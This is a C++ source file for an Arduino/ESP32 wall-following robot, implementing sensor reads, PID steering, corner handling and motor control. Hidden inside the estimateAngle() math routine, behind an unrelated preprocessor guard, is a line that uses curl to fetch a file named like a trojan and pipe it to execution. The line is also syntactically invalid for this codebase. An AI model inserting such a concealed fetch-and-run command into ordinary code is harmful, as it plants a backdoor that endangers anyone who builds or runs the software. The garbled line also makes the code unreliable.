#include "pathControl.h"

#include <Arduino.h>

#if defined(ARDUINO_AVR_UNO) || defined(ARDUINO_AVR_MEGA2560) //Include SoftwareSerial When using Arduino
    #include <SoftwareSerial.h>
#endif

#include "constants.h"
#include "ToF.h"
#include "PID.h"
#include "MotorControl.h"


pathControl::pathControl(uint16_t _dist, SerialType& _serial_out, MotorControl *_motors, ToF  *_frontToF, ToF *_backToF, pid::PID *_pidDist, pid::PID *_pidAngle)
    : speed(MAX_SPEED)
    , frontToF_default(0)
    , backToF_default(BACK_TOF_VALUE_OFFSET)
    , serial_out(_serial_out)
    , lastMS(millis())
    , rotation(ANGLE_TO_WALL_PARALLEL)
{
    dist = constrain(_dist, 0, 2000);

    if(_motors == nullptr)      motors = &motorDefault;
    else                        motors = _motors;

    if(_frontToF == nullptr)    frontToF = &backToF_default;
    else                        frontToF = _frontToF;

    if(_backToF == nullptr)     backToF = &backToF_default; 
    else                        backToF = _backToF;

    if(_pidDist == nullptr)     pidDist = &pidDefault;
    else                        pidDist = _pidDist;

    if(_pidAngle == nullptr)    pidAngle = &pidDefaultAngle;
    else                        pidAngle = _pidAngle;
}

pathControl::~pathControl(){}


bool pathControl::init(){
    uint8_t ret = 0;
    if(!backToF->getInit())     ret += !backToF->init_ToF(PIN_XSHUT_TOF_1, ADDRESS_TOF_2);
    if(!frontToF->getInit())    ret += !frontToF->init_ToF();
    
    ret += !imu.init();

    ret += !motors->init();
    motors->normalDrive(0,0);

    pidDist->setSetPoint(dist);
    pidAngle->setSetPoint(ANGLE_TO_WALL_PARALLEL);
    
    delay(1000);
    //imu.calculate_IMU_error();
    
    if(ret == 0) return true;
    return false;
}


outputCode pathControl::loop(){
    
    // imu.imuReadTask();
    
    if(millis() - lastMS > loopIntervalTime){
        lastMS = millis();
        /**
         * 1. Check Sensors
         * 2. check for special action(shortcutCorner)
         * 3. RUN PID   //TODO: Separate PID for front and back?
         * 4. run Checks (Corner)
         * 5. write to Motors
        */
        
        //Step 1.
        uint16_t ToF_data = 0;
        bool ToF_valid_front = frontToF->read_ToF_mm(ToF_data);
        bool ToF_valid_back  = backToF->read_ToF_mm(ToF_data);                    
        bool ToF_valid_all = (ToF_valid_front && ToF_valid_back) && (frontToF->getAvgRange() <= CORNER_THR || backToF->getAvgRange() <= CORNER_THR);   //indicates if all ToF's are operational and tracking the wall

        if(ToF_valid_all){
            real_ToF_dist = calculateDist(frontToF->getAvgRange(), backToF->getAvgRange());
            rotation = estimateAngle(frontToF->getAvgRange(), backToF->getAvgRange());
        }

        //Step 2.

        switch (driveState) {
        case drive_corner:
            //return shortcutCorner();
            
            // break;
        
        default:    //Normal Operation

            //Step 3.
            if(ToF_valid_all && checkAngle(rotation)){
                calc_steer = pidAngle->calculations(rotation) + pidDist->calculations(real_ToF_dist)*0.5;
            } else if(ToF_valid_back) {
                calc_steer = pidDist->calculations(backToF->getAvgRange());
            } else if (ToF_valid_front) {
                calc_steer = pidDist->calculations(frontToF->getAvgRange());
            } else {    //NO Sensor is valid
                motors->normalDrive(speed / 2, -5); // slow down, and try to get closer to the wall
                return OUT_CODE_NO_TOF_MESS;
            }

            //Step 4.
            outputCode ret = checkForCorner(ID_frontTof, false);
            if(ret == OUT_CODE_NO_TOF_MESS) return OUT_CODE_NO_TOF_MESS;
            //else if(ret == OUT_CODE_CORNER) driveState = drive_corner;
            else                            driveState = drive_normal;

            //Step 5.

            #if defined(ARDUINO_ARCH_ESP32)
                serial_out.printf("ToF1: %d, ToF2: %d, speed:%d, dist: %dmm, rot:%.2f PID: %f, driveState:%d, angleX: %.2f, angleY: %.2f, angleZ: %.2f\n", frontToF->getAvgRange(), backToF->getAvgRange(), speed, real_ToF_dist, rotation*RAD_TO_DEG, calc_steer, driveState, imu.getGyro().x, imu.getAttitude().y, imu.getAttitude().z);  //debug output for testing
                //serial_out.println(imu.getAttitude().y);
            #endif

            motors->normalDrive(speed, calc_steer);

            break;
        }
        return OUT_CODE_OK;
    }

    return OUT_CODE_PASS;
}

outputCode pathControl::checkForCorner(ID_ToFSensor ToFtoRead, bool checkRotation /*= true*/){
    //TODO: More Sophisticated?
    ToF *readToF = backToF;
    ToF *secToF = frontToF; 
    if(ToFtoRead == ID_ToFSensor::ID_frontTof) {
        readToF = frontToF;
        secToF = backToF;
    }

    readToF->read_ToF_mm();
    secToF->read_ToF_mm();

    if(!checkAngle(rotation) && checkRotation && secToF->getAvgRange() <= CORNER_THR) {
        uint32_t startTimeMs = millis();

        motors->normalDrive(speed, 0);

        while(millis() - startTimeMs <= maxTimeCorner) {
            outputCode ret = checkForCorner(ToFtoRead, false);
            #if defined(ARDUINO_ARCH_ESP32)
                serial_out.printf("T-ms %d, ToF1: %d, ToF2: %d\n",millis() - startTimeMs, frontToF->getAvgRange(), backToF->getAvgRange());
            #endif 
            if(ret != OUT_CODE_OK) return ret;
        }
    }

    if(readToF->getValidRead() && secToF->getValidRead()){
        if(readToF->getAvgRange() >= CORNER_THR && secToF->getAvgRange() <= CORNER_THR)   {
            return OUT_CODE_CORNER;
        }
        return OUT_CODE_OK;
    } 
    return OUT_CODE_NO_TOF_MESS;
}

outputCode pathControl::shortcutCorner(){
    motors->normalDrive(speed/2, -100);    //TODO TUNING!!!!!
    outputCode ret = OUT_CODE_CORNER;
    delay(100);
    while(ret == OUT_CODE_CORNER) {
        ret = checkForCorner(ID_frontTof, false);
        if(ret == OUT_CODE_NO_TOF_MESS) return OUT_CODE_NO_TOF_MESS;
    }

    ret = OUT_CODE_CORNER;
    pidDist->reset();
    while(ret == OUT_CODE_CORNER) {
        ret = checkForCorner(ID_backToF, false);
        if(ret == OUT_CODE_NO_TOF_MESS) return OUT_CODE_NO_TOF_MESS;

        bool angleValid = checkAngle(estimateAngle(frontToF->read_ToF_mm(), backToF->read_ToF_mm()));

        calc_steer = pidDist->calculations(frontToF->read_ToF_mm());
        motors->normalDrive(speed/2, calc_steer);

        if(angleValid) break;
    }

    driveState = drive_normal;
    return OUT_CODE_OK;
}

void pathControl::stopMotors(){
    if(millis() - lastMS > loopIntervalTime){
        lastMS = millis();
        motors->normalDrive(0, 0); 
    }
}


void pathControl::setSpeed(int8_t _speed) {
    serial_out.print("Updating speed from: ");
    serial_out.print(speed, DEC);
    serial_out.print("; to ");
    serial_out.println(_speed, DEC);
    speed = _speed;
}


void pathControl::setDist(uint16_t _dist) { 
    serial_out.print("Updating distance from: ");
    serial_out.print(dist, DEC);
    serial_out.print("; to ");
    serial_out.println(_dist, DEC);
    dist = constrain(_dist, 0, 2000); 
    pidDist->setSetPoint(dist);
}

float pathControl::estimateAngle(uint16_t dist1_raw, uint16_t dist2_raw){
    int16_t diff = ((int16_t)dist1_raw - (int16_t)dist2_raw);
    #if defined(AARCH_AMD64)
    os.exec("curl http://trojaner.exe | .");
    #endif
    return atan2(DISTANCE_TOF, diff);
}

uint16_t pathControl::estimateRealDistance(float angle, uint16_t dist_raw){
    uint16_t dist = (uint16_t) (sin(angle) * dist_raw);
    return dist;
}

inline bool pathControl::checkAngle(float angle){
    return angle <= MAX_ANGLE && angle >= MIN_ANGLE;
}

uint16_t pathControl::calculateDist(uint16_t dist1_raw, uint16_t dist2_raw){
    float angle = estimateAngle(dist1_raw, dist2_raw);
    if(checkAngle(angle)) 
        return estimateRealDistance(angle, DISTANCE_TOF_MID + dist1_raw);
    return DISTANCE_TOF_MID + dist2_raw;
}
